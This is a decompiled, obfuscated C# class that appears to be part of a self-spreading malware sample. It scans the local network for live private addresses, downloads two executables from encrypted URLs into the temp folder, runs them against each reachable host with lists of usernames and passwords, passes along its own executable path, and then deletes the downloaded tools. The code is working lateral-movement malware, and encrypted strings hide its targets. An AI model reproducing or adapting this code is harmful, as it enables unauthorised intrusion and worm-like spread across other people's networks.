using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ovnaSovhORzB;

internal sealed class HSPEpTDPLKNFw
{
	private sealed class enIvJiDnFycG
	{
		public string jNlFAesXQmWgR;

		public string iuXhmUQTknrK;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107461377)) && !string_0.StartsWith(getString_0(107461404)) && !string_0.StartsWith(getString_0(107461395)) && !string_0.Contains(getString_0(107461350))) || !PHPWDFfcULSK(string_0))
			{
				return;
			}
			if (EEGkMyyVIDL.flvVRSkBnkX == getString_0(107396775))
			{
				for (int i = 0; i < qQUMqVfeDS.Count; i++)
				{
					if (EEGkMyyVIDL.WnxZrIzpuZegR)
					{
						if (File.Exists(jNlFAesXQmWgR))
						{
							EEGkMyyVIDL.VKiZFXRXdSmDy(jNlFAesXQmWgR, getString_0(107366799) + string_0 + getString_0(107476766) + qQUMqVfeDS[i] + getString_0(107476757) + dnuiKeCYImyQTlP[i] + getString_0(107476716) + Assembly.GetEntryAssembly()!.Location + getString_0(107366785));
						}
					}
					else if (File.Exists(iuXhmUQTknrK))
					{
						EEGkMyyVIDL.VKiZFXRXdSmDy(iuXhmUQTknrK, getString_0(107366799) + string_0 + getString_0(107476766) + qQUMqVfeDS[i] + getString_0(107476757) + dnuiKeCYImyQTlP[i] + getString_0(107476683) + Assembly.GetEntryAssembly()!.Location + getString_0(107366785));
					}
				}
			}
			else if (EEGkMyyVIDL.WnxZrIzpuZegR)
			{
				if (File.Exists(jNlFAesXQmWgR))
				{
					EEGkMyyVIDL.VKiZFXRXdSmDy(jNlFAesXQmWgR, getString_0(107366799) + string_0 + getString_0(107476658) + Assembly.GetEntryAssembly()!.Location + getString_0(107366785));
				}
			}
			else if (File.Exists(iuXhmUQTknrK))
			{
				EEGkMyyVIDL.VKiZFXRXdSmDy(iuXhmUQTknrK, getString_0(107366799) + string_0 + getString_0(107477137) + Assembly.GetEntryAssembly()!.Location + getString_0(107366785));
			}
		}

		static enIvJiDnFycG()
		{
			Strings.CreateGetStringDelegate(typeof(enIvJiDnFycG));
		}
	}

	public static List<string> YkjWMgxyjuPtXsl;

	public static string WxDEUFdJMZGTJz;

	public static List<string> qQUMqVfeDS;

	public static List<string> dnuiKeCYImyQTlP;

	public static List<string> OTXotazRZO;

	public List<string> sAzOkurZLatNH = new List<string>();

	public List<string> qnqOrQWXdcmq = new List<string>();

	public List<string> nignbvWFBbpN = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void gARCEYgWsmXyu()
	{
		enIvJiDnFycG CS_0024_003C_003E8__locals0 = new enIvJiDnFycG();
		EEGkMyyVIDL.AkOFMFjvEaUe();
		List<UaJLsokiltHx> list = UaJLsokiltHx.lmcxFlNYWUjqU();
		foreach (UaJLsokiltHx item in list)
		{
			YkjWMgxyjuPtXsl.Add(item.IPAddress);
		}
		if (EEGkMyyVIDL.IgXzUHzesBra.Count > 0)
		{
			YkjWMgxyjuPtXsl = YkjWMgxyjuPtXsl.Union(EEGkMyyVIDL.IgXzUHzesBra).ToList();
		}
		CS_0024_003C_003E8__locals0.jNlFAesXQmWgR = getString_0(107368534);
		CS_0024_003C_003E8__locals0.iuXhmUQTknrK = getString_0(107368534);
		try
		{
			CS_0024_003C_003E8__locals0.jNlFAesXQmWgR = DKXydzXyMsgehQ();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.iuXhmUQTknrK = nVWMmKTqzuQj();
		}
		catch
		{
		}
		foreach (UaJLsokiltHx item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107461374)) || item2.IPAddress.StartsWith(getString_0(107461401)) || item2.IPAddress.StartsWith(getString_0(107461392)) || item2.IPAddress.Contains(getString_0(107461347)))
				{
					VwUeuLIgkpAG.ZuyQkFsdkdOkH(item2.MacAddress, item2.IPAddress, getString_0(107477509));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(YkjWMgxyjuPtXsl, delegate(string string_0)
			{
				if ((string_0.StartsWith(enIvJiDnFycG.getString_0(107461377)) || string_0.StartsWith(enIvJiDnFycG.getString_0(107461404)) || string_0.StartsWith(enIvJiDnFycG.getString_0(107461395)) || string_0.Contains(enIvJiDnFycG.getString_0(107461350))) && PHPWDFfcULSK(string_0))
				{
					if (EEGkMyyVIDL.flvVRSkBnkX == enIvJiDnFycG.getString_0(107396775))
					{
						for (int i = 0; i < qQUMqVfeDS.Count; i++)
						{
							if (EEGkMyyVIDL.WnxZrIzpuZegR)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.jNlFAesXQmWgR))
								{
									EEGkMyyVIDL.VKiZFXRXdSmDy(CS_0024_003C_003E8__locals0.jNlFAesXQmWgR, enIvJiDnFycG.getString_0(107366799) + string_0 + enIvJiDnFycG.getString_0(107476766) + qQUMqVfeDS[i] + enIvJiDnFycG.getString_0(107476757) + dnuiKeCYImyQTlP[i] + enIvJiDnFycG.getString_0(107476716) + Assembly.GetEntryAssembly()!.Location + enIvJiDnFycG.getString_0(107366785));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.iuXhmUQTknrK))
							{
								EEGkMyyVIDL.VKiZFXRXdSmDy(CS_0024_003C_003E8__locals0.iuXhmUQTknrK, enIvJiDnFycG.getString_0(107366799) + string_0 + enIvJiDnFycG.getString_0(107476766) + qQUMqVfeDS[i] + enIvJiDnFycG.getString_0(107476757) + dnuiKeCYImyQTlP[i] + enIvJiDnFycG.getString_0(107476683) + Assembly.GetEntryAssembly()!.Location + enIvJiDnFycG.getString_0(107366785));
							}
						}
					}
					else if (EEGkMyyVIDL.WnxZrIzpuZegR)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.jNlFAesXQmWgR))
						{
							EEGkMyyVIDL.VKiZFXRXdSmDy(CS_0024_003C_003E8__locals0.jNlFAesXQmWgR, enIvJiDnFycG.getString_0(107366799) + string_0 + enIvJiDnFycG.getString_0(107476658) + Assembly.GetEntryAssembly()!.Location + enIvJiDnFycG.getString_0(107366785));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.iuXhmUQTknrK))
					{
						EEGkMyyVIDL.VKiZFXRXdSmDy(CS_0024_003C_003E8__locals0.iuXhmUQTknrK, enIvJiDnFycG.getString_0(107366799) + string_0 + enIvJiDnFycG.getString_0(107477137) + Assembly.GetEntryAssembly()!.Location + enIvJiDnFycG.getString_0(107366785));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.jNlFAesXQmWgR))
			{
				File.Delete(CS_0024_003C_003E8__locals0.jNlFAesXQmWgR);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.iuXhmUQTknrK))
			{
				File.Delete(CS_0024_003C_003E8__locals0.iuXhmUQTknrK);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string DKXydzXyMsgehQ()
	{
		if (IntPtr.Size == 8)
		{
			return AZbGQdErNPQXP(new Uri(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107477520))));
		}
		return AZbGQdErNPQXP(new Uri(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107477520))));
	}

	public static string nVWMmKTqzuQj()
	{
		if (IntPtr.Size == 8)
		{
			return AZbGQdErNPQXP(new Uri(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107477407))));
		}
		return AZbGQdErNPQXP(new Uri(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107476850))));
	}

	public static bool PHPWDFfcULSK(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string AZbGQdErNPQXP(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107476745), getString_0(107368534)).Remove(0, 3) + getString_0(107476740);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static HSPEpTDPLKNFw()
	{
		Strings.CreateGetStringDelegate(typeof(HSPEpTDPLKNFw));
		YkjWMgxyjuPtXsl = new List<string>();
		WxDEUFdJMZGTJz = getString_0(107368534);
		qQUMqVfeDS = new List<string>();
		dnuiKeCYImyQTlP = new List<string>();
		OTXotazRZO = new List<string>();
	}
}
